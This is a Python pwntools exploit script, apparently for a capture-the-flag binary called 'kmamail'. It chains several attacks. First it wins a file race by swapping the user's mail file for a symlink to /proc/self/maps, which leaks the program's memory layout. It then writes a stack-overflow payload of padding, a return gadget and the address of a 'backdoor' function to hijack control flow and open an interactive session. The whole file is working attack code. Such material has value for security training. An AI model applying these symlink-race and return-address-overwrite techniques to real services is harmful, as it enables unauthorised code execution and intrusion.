from pwn import *
import os, re, time, shutil

context.binary = elf = ELF("./kmamail", checksec=False)

gs = '''
set pagination off
b usleep
run
'''


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def mes(io, x): io.sendlineafter(b"> ", str(x).encode())

def reg(io, name, passwd):
    mes(io, 1)
    io.sendlineafter(b"Username: ", name)
    io.sendlineafter(b"Password: ", passwd)

def login(io, name, passwd):
    mes(io, 2)
    io.sendlineafter(b"Username: ", name)
    io.sendlineafter(b"Password: ", passwd)

def put(path, data=None, link=None):
    if os.path.lexists(path):
        os.unlink(path)
    if link:
        os.symlink(link, path)
    else:
        open(path, "wb").write(data)

def main():
    if os.path.isdir("./data"):
        shutil.rmtree("./data")

    io = start()
    name = b"huhu"
    passwd = b"racecondition101"
    mail = "./data/huhu/mail"

    reg(io, name, passwd)
    login(io, name, passwd)

    put(mail, b"A"*0x400)
    mes(io, 2)
    put(mail, link="/proc/self/maps")
    out = io.recvuntil(b"---- MENU ----")

    s, off = re.search(
        rb"([0-9a-f]+)-[0-9a-f]+\s+\S+\s+([0-9a-f]+)\s+[0-9a-f:]+\s+\d+\s+.*?/kmamail(?:\n|$)",
        out
    ).groups()
    base = int(s, 16) - int(off, 16)

    ret = base + 0x101a
    win  = base + elf.sym.backdoor

    put(mail, b"0123456789")
    mes(io, 2)
    put(mail, b"\n\n" + b"A"*0x2c + p8(0x57) + p64(ret) + p64(win) + b"\n")

    io.interactive()

if __name__ == "__main__":
    main()
